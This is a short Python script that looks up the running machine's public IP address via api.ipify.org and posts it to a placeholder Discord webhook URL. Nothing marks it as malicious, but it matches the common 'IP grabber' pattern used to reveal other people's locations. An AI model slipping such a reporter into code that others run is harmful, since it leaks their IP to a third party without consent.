import requests

def get_real_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        ip_data = response.json()
        return ip_data['ip']
    except Exception as e:
        return str(e)

# Replace with your actual webhook URL
webhook_url = 'Your Webhook Discord bot url'
real_ip = get_real_ip()
message = f'Real IP Address: {real_ip}'

data = {
    "content": message
}

response = requests.post(webhook_url, json=data)

if response.status_code == 204:
    print("IP sent successfully!")
else:
    print(f"Failed to send IP. Status code: {response.status_code}")